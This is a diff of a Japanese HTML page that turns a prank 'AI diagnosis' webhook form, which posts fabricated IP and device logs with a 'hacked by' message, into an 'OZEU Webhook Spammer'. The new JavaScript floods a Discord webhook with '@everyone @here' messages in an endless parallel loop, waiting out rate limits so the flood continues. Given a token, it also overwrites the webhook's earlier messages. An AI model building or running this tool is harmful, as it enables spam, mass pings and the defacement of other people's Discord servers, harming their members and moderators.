@@ -2,56 +2,263 @@
 <html lang="ja">
 <head>
   <meta charset="UTF-8">
-  <title>AI診断（笑）Webhook送信フォーム</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>OZEU Webhook Spammer</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
   <style>
+    /* スクロールバーのスタイル */
+    ::-webkit-scrollbar { width: 6px; }
+    ::-webkit-scrollbar-track { background: #202225; border-radius: 3px; }
+    ::-webkit-scrollbar-thumb { background: #5865f2; border-radius: 3px; }
+    ::-webkit-scrollbar-thumb:hover { background: #7289da; }
+
+    *, *::before, *::after { box-sizing: border-box; }
     body {
-      background: #1a1a1a;
-      color: #fff;
-      font-family: monospace;
-      padding: 40px;
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(135deg,#2f3136,#1e1f22);
+      color:#fff;
+      margin:0; padding:0;
+      display:flex; justify-content:center; align-items:center;
+      height:100vh;
     }
     .card {
-      background: #2e2e2e;
-      border-radius: 10px;
-      padding: 20px;
-      max-width: 500px;
-      margin: auto;
+      background:#36393f;
+      padding:32px;
+      border-radius:20px;
+      box-shadow:0 15px 35px rgba(0,0,0,.5);
+      width:100%; max-width:600px;
+      animation:fadeIn .8s ease;
+      overflow:auto; max-height:95vh;
     }
-    input, button {
-      display: block;
-      width: 100%;
-      margin: 10px 0;
-      padding: 10px;
-      font-size: 16px;
-      border-radius: 6px;
-      border: none;
+    @keyframes fadeIn {
+      from { opacity:0; transform:translateY(20px); }
+      to   { opacity:1; transform:translateY(0); }
     }
-    button {
-      background: #ff4081;
-      color: white;
-      cursor: pointer;
+    h2 { color:#adb8ff; text-align:center; margin:0 0 24px; font-weight:600; }
+    label { display:block; margin-top:18px; font-size:14px; }
+
+    /* テキスト入力 */
+    input[type="text"], textarea {
+      width:100%; padding:10px; margin-top:6px;
+      border-radius:8px; border:none;
+      background:#202225; color:#fff;
+      font-family:monospace; resize:vertical;
     }
-    #log {
-      margin-top: 20px;
-      background: #111;
-      padding: 10px;
-      font-size: 13px;
-      height: 150px;
-      overflow-y: auto;
-      border-radius: 6px;
-      white-space: pre-wrap;
+    textarea { overflow-y:auto; }
+    input[type="number"] {
+      padding:6px; margin-top:6px;
+      border-radius:8px; border:none;
+      background:#202225; color:#fff;
+      font-family:monospace; appearance:none;
+      width:80px;
+    }
+    input[type=number]::-webkit-inner-spin-button,
+    input[type=number]::-webkit-outer-spin-button {
+      -webkit-appearance:none; margin:0;
+    }
+
+    /* フレックス行 */
+    .row {
+      display:flex; gap:12px; align-items:center;
+    }
+    .row > * { flex:none; }
+    .row label,
+    .row .checkbox-container { margin-top:0; }
+
+    /* トグルスイッチ */
+    .checkbox-container {
+      display:flex; align-items:center; gap:8px;
+      cursor:pointer; font-size:14px; user-select:none;
+      margin-top:6px;
+    }
+    .checkbox-container input {
+      appearance:none; width:36px; height:18px;
+      background:#4f545c; border-radius:18px;
+      position:relative; transition:background .3s ease;
+    }
+    .checkbox-container:hover input { background:#5a5f68; }
+    .checkbox-container input:focus {
+      outline:none; box-shadow:0 0 0 3px rgba(114,137,218,0.5);
+    }
+    .checkbox-container input::before {
+      content:''; position:absolute;
+      width:14px; height:14px; border-radius:50%;
+      background:#fff; top:2px; left:2px;
+      transition:transform .3s cubic-bezier(.68,-.55,.27,1.55);
+    }
+    .checkbox-container input:checked { background:#7289da; }
+    .checkbox-container input:checked::before {
+      transform:translateX(18px);
+    }
+    .checkbox-container span { transition:color .3s; }
+    .checkbox-container input:checked + span {
+      color:#adb8ff;
+    }
+
+    /* ボタン */
+    button.primary {
+      margin-top:24px; width:50%; padding:14px;
+      border:none; border-radius:14px;
+      background:linear-gradient(135deg,#6d75ff,#5865f2);
+      color:#fff; font-weight:700; font-size:18px;
+      letter-spacing:.5px; cursor:pointer; position:relative;
+      box-shadow:
+        0 4px 15px rgba(88,101,242,.4),
+        0 0 10px rgba(255,255,255,.1),
+        inset 0 0 5px rgba(255,255,255,.2);
+      overflow:hidden; transition:all .3s;
+    }
+    button.primary:hover {
+      background:linear-gradient(135deg,#7d89ff,#4e57e0);
+      box-shadow:
+        0 6px 22px rgba(88,101,242,.6),
+        0 0 24px rgba(255,255,255,.2),
+        inset 0 0 10px rgba(255,255,255,.3);
+      transform:scale(1.03);
+    }
+    button.primary:active {
+      transform:scale(0.96);
+      box-shadow:inset 0 4px 6px rgba(0,0,0,.3);
+    }
+    button.primary.loading {
+      color:#fff; pointer-events:none;
+    }
+    button.secondary {
+      margin-top:24px; width:50%; padding:14px;
+      border:none; border-radius:14px;
+      background:linear-gradient(135deg,#e74c3c,#c0392b);
+      color:#fff; font-weight:700; font-size:18px;
+      letter-spacing:.5px; cursor:pointer; position:relative;
+      box-shadow:
+        0 4px 15px rgba(236,81,81,.4),
+        0 0 10px rgba(255,255,255,.1),
+        inset 0 0 5px rgba(255,255,255,.2);
+      overflow:hidden; transition:all .3s;
+    }
+    button.secondary:hover {
+      background:linear-gradient(135deg,#c0392b,#e74c3c);
+      box-shadow:
+        0 6px 22px rgba(236,81,81,.6),
+        0 0 24px rgba(255,255,255,.2),
+        inset 0 0 10px rgba(255,255,255,.3);
+      transform:scale(1.03);
+    }
+    button.secondary:active {
+      transform:scale(0.96);
+      box-shadow:inset 0 4px 6px rgba(0,0,0,.3);
+    }
+
+    .button-container {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+    }
+	.file-input-wrapper {
+		position: relative;
+		margin-top: 6px;
+	}
+	.file-label {
+		display: inline-block;
+		padding: 10px 16px;
+		background-color: #6d75ff;
+		color: #fff;
+		border-radius: 8px;
+		cursor: pointer;
+		font-size: 14px;
+		font-weight: 500;
+		transition: background 0.2s ease;
+	}
+	.file-label:hover {
+		background-color: #5865f2;
+	}
+	.file-name {
+		display: inline-block;
+		margin-left: 12px;
+		font-size: 13px;
+		color: #aaa;
+	}
+	input[type="file"] {
+		display: none;
+	}
+
+    #log { margin-top:20px; padding:10px; height:120px; overflow-y:auto; background:#202225; border-radius:10px; font-family:monospace; font-size:12px; white-space:pre-wrap; resize: vertical;}
+    @media (max-width: 600px) {
+      .card {
+        padding: 16px;
+        max-width: 95%;
+        border-radius: 10px;
+      }
+
+      h2 {
+        font-size: 18px;
+        margin-bottom: 16px;
+      }
+
+      label {
+        font-size: 13px;
+        margin-top: 12px;
+      }
+
+      input[type="text"],
+      textarea {
+        padding: 8px;
+        font-size: 12px;
+      }
+
+      textarea {
+        height: auto;
+        min-height: 60px;
+      }
+
+      button.primary,
+      button.secondary {
+        padding: 10px;
+        font-size: 16px;
+        width: 100%;
+        margin-top: 12px;
+      }
+
+      .button-container {
+        flex-direction: column;
+        gap: 8px;
+      }
+
+      .checkbox-container {
+        font-size: 13px;
+        flex-direction: row;
+      }
+
+      .file-label {
+        padding: 8px 12px;
+        font-size: 13px;
+      }
+
+      .file-name {
+        font-size: 12px;
+      }
+
+      #log {
+        height: 80px;
+        font-size: 11px;
+      }
     }
   </style>
 </head>
 <body>
   <div class="card">
-    <h2>AI診断（笑）送信フォーム</h2>
-    <input type="text" id="webhook" placeholder="Webhook URL" />
-    <input type="text" id="name" placeholder="診断する名前（任意）" />
-    <input type="text" id="customName" placeholder="Webhook表示名（任意）" />
-    <input type="text" id="customContent" placeholder="本文（任意）" />
-    <button onclick="send()">送信</button>
+    <h2>OZEU Webhookスパム ＋ 編集</h2>
+    <label>Webhook URL
+      <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/..." />
+    </label>
+    <label>Webhookトークン（任意 / 編集用）
+      <input type="text" id="token" placeholder="MTAx..." />
+    </label>
+    <label>並列数
+      <input type="number" id="threads" value="2" />
+    </label>
+    <div class="button-container">
+      <button class="primary" onclick="start()">実行</button>
+    </div>
     <div id="log"></div>
   </div>
 
@@ -62,119 +269,92 @@
       el.scrollTop = el.scrollHeight;
     };
 
-    // ランダム生成関数
-    function getRandomIP() {
-      return Array(4).fill(0).map(() => Math.floor(Math.random() * 256)).join(".");
-    }
+    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
 
-    function getRandomCountryCode() {
-      const codes = ["JP", "US", "KR", "CN", "DE", "RU", "FR", "IN", "GB", "CA", "BR", "AU"];
-      return codes[Math.floor(Math.random() * codes.length)];
-    }
-
-    function getRandomRegion() {
-      const regions = ["Tokyo", "Seoul", "California", "Berlin", "Paris", "Moscow", "London", "Ontario", "Beijing", "Delhi", "São Paulo", "Sydney"];
-      return regions[Math.floor(Math.random() * regions.length)];
-    }
-
-    function getRandomOrg() {
-      const orgs = ["NTT", "SoftBank", "SK Telecom", "China Telecom", "Vodafone", "Orange", "AT&T", "Verizon", "Rogers", "Airtel", "Optus", "Claro"];
-      return orgs[Math.floor(Math.random() * orgs.length)];
-    }
-
-    function getRandomUA() {
-      const uas = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/114.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 Version/16.0 Mobile",
-        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/110.0.5481.100 Mobile",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 Version/16.1 Safari/605.1.15",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/112.0.5615.49"
-      ];
-      return uas[Math.floor(Math.random() * uas.length)];
-    }
-
-    function getRandomLang() {
-      const langs = ["ja-JP", "en-US", "ko-KR", "zh-CN", "de-DE", "ru-RU", "fr-FR", "pt-BR", "hi-IN"];
-      return langs[Math.floor(Math.random() * langs.length)];
-    }
-
-    function getRandomSize() {
-      const sizes = ["1920x1080", "1366x768", "1440x900", "1536x864", "1280x720", "360x640", "414x896"];
-      return sizes[Math.floor(Math.random() * sizes.length)];
-    }
-
-    function getRandomResult() {
-      const results = [
-        "ド天然顔", "地雷顔", "映え顔", "くそきもい", "ねるねるねるね", "PR2桁",
-        "童顔", "老け顔", "撮り鉄", "陰キャ", "加工モンスター", "赤ちゃんみ"
-      ];
-      return results[Math.floor(Math.random() * results.length)];
-    }
-
-    async function send() {
-      const webhook = document.getElementById("webhook").value.trim();
-      const name = document.getElementById("name").value.trim() || "名無し";
-      const customName = document.getElementById("customName").value.trim() || "AI診断Bot";
-      const customContent = document.getElementById("customContent").value.trim() || "hacked by https://dpko.net/shindan";
-
-      if (!webhook.startsWith("https://discord.com/api/webhooks/")) {
-        log("[×] Webhook URLが不正だよ");
-        return;
-      }
-
-      const ip = getRandomIP();
-      const country = getRandomCountryCode();
-      const region = getRandomRegion();
-      const org = getRandomOrg();
-      const ua = getRandomUA();
-      const lang = getRandomLang();
-      const size = getRandomSize();
-      const result = getRandomResult();
-
-      const fakeImage = new Blob([new Uint8Array([137,80,78,71,13,10,26,10])], { type: "image/png" });
-      const fakeVideo = new Blob([], { type: "video/webm" });
-
-      const embed = {
-        title: "AI診断ログ（フェイク）",
-        color: 0xff66cc,
-        fields: [
-          { name: "名前", value: name, inline: true },
-          { name: "IP", value: ip, inline: true },
-          { name: "国/地域", value: `${country} / ${region}`, inline: true },
-          { name: "通信会社", value: org, inline: false },
-          { name: "デバイス", value: ua, inline: false },
-          { name: "画面", value: size, inline: true },
-          { name: "言語", value: lang, inline: true },
-          { name: "診断結果", value: result, inline: false }
-        ]
-      };
-
-      const formData = new FormData();
-      formData.append("file0", fakeImage, "image1.png");
-      formData.append("file1", fakeImage, "image2.png");
-      formData.append("video", fakeVideo, "video.webm");
-
-      const payload = {
-        content: customContent,
-        embeds: [embed],
-        username: customName
-      };
-      formData.append("payload_json", JSON.stringify(payload));
-
+    async function sendOne(webhook, msg) {
       try {
         const res = await fetch(webhook, {
           method: "POST",
-          body: formData
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: msg })
         });
 
-        if (res.ok) {
-          log("[✓] 偽診断をWebhookに送信したよ！");
+        if (res.status === 204 || res.status === 200) {
+          log("[✓] Sent");
+        } else if (res.status === 429) {
+          const json = await res.json();
+          log("[!] Ratelimit: " + json.retry_after + "ms");
+          await sleep(json.retry_after);
         } else {
-          log("[×] 送信失敗: " + res.status);
+          log("[?] Status: " + res.status);
+        }
+      } catch (e) {
+        log("[ERR] " + e.message);
+      }
+    }
+
+    async function parallelSpam(webhook, threadCount) {
+      const msg = "@everyone@here AI診断（笑）";
+      while (true) {
+        const jobs = [];
+        for (let i = 0; i < threadCount; i++) {
+          jobs.push(sendOne(webhook, msg));
+        }
+        await Promise.all(jobs);
+        await sleep(500);
+      }
+    }
+
+    async function editOldMessages(webhook, token) {
+      const url = webhook + "/messages";
+      try {
+        const res = await fetch(url, { headers: { Authorization: token } });
+        if (!res.ok) return log("[×] 編集用メッセージ取得失敗: " + res.status);
+
+        const messages = await res.json();
+        for (const msg of messages) {
+          const patch = await fetch(`${webhook}/messages/${msg.id}`, {
+            method: "PATCH",
+            headers: {
+              Authorization: token,
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ content: "@everyone @here AI診断（笑）" })
+          });
+
+          if (patch.status === 429) {
+            const json = await patch.json();
+            log("[!] 編集Ratelimit: " + json.retry_after + "ms");
+            await sleep(json.retry_after);
+          } else if (patch.ok) {
+            log("[✓] 編集成功: " + msg.id);
+          } else {
+            log("[×] 編集失敗: " + msg.id + " (" + patch.status + ")");
+          }
+          await sleep(1000);
         }
       } catch (err) {
-        log("[ERR] " + err.message);
+        log("[ERR] 編集中エラー: " + err.message);
       }
+    }
+
+    async function start() {
+      const webhook = document.getElementById("webhook").value.trim();
+      const token = document.getElementById("token").value.trim();
+      const threads = parseInt(document.getElementById("threads").value.trim()) || 2;
+
+      if (!webhook.startsWith("https://discord.com/api/webhooks/")) {
+        log("[×] Webhook URL不正");
+        return;
+      }
+
+      if (token) {
+        log("[i] 過去メッセージ編集開始...");
+        await editOldMessages(webhook, token);
+      }
+
+      log(">> スパム送信開始（" + threads + " 並列）...");
+      await parallelSpam(webhook, threads);
     }
   </script>
 </body>
